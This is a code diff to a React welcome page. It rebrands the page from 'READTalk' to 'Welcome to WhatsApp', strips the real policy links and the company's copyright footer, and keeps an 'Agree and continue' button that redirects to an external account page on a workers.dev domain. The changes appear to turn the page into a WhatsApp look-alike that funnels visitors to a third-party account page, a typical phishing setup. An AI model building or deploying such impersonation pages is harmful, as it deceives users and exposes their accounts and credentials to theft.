@@ -1,14 +1,8 @@
 // App.tsx
-import { useState } from 'react'
-import viteLogo from '/vite.svg'
 import './App.css'
 
 function App() {
-  const [count, setCount] = useState(0)
-
   const handleAgree = () => {
-    setCount((count) => count + 1)
-    console.log('Agreed! Count:', count + 1)
     // Redirect ke URL yang ditentukan
     window.location.href = 'https://account.soeparnocorp.workers.dev/'
   }
@@ -17,16 +11,15 @@ function App() {
     <>
       <div>
         <a href="#" onClick={(e) => e.preventDefault()}>
-          <img src={viteLogo} className="logo coin-flip" alt="Vite logo" />
+          <img src="/vite.svg" className="logo coin-flip" alt="Vite logo" />
         </a>
       </div>
       
       <div className="content-wrapper">
-        <h1>Welcome to READTalk</h1>
+        <h1>Welcome to WhatsApp</h1>
         
         <p className="terms-text">
-          Read our <a href="https://readtalk.pages.dev/">Privacy Policies</a>. Tap "Agree and continue" 
-          to accept our <a href="https://readtalk.pages.dev/">Terms of Service</a>.
+          Read our <a href="#">Privacy Policies</a>. Tap "Agree and continue" to accept our Terms of Service.
         </p>
 
         <div className="language-selector">
@@ -37,13 +30,10 @@ function App() {
           className="agree-button"
           onClick={handleAgree}
         >
-          Agree and continue {/* State count dihapus dari tampilan */}
+          Agree and continue
         </button>
 
-        {/* FOOTER TETAP ADA - bagian dari struktur framework */}
-        <p className="read-the-docs">
-          © 2026 SOEPARNO ENTERPRISE Corp.
-        </p>
+        {/* Footer dihapus sesuai permintaan */}
       </div>
     </>
   )
